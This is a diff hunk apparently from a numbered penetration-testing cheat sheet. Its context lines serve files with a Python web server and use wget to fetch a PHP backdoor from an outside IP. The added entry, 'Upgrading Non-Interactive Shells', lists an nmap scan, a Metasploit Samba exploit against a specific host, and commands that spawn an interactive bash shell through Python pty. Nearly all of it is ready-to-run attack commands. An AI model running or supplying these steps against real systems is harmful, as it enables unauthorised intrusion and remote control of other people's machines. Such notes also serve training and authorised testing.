@@ -2034,6 +2034,15 @@ python3 -m http.server 80
 cd /temp
 wget http://192.196.45.2/php-backdoor.php
 ```
-106)
-
-
+106)  Upgrading Non-Interactive Shells
+```
+ifconfig
+nmap -sV 192.185.44.3
+msfconsole
+use exploit/linux/samba/is_known_pipename
+set RHOSTS 192.185.44.3
+exploit
+/bin/bash -i
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+107)
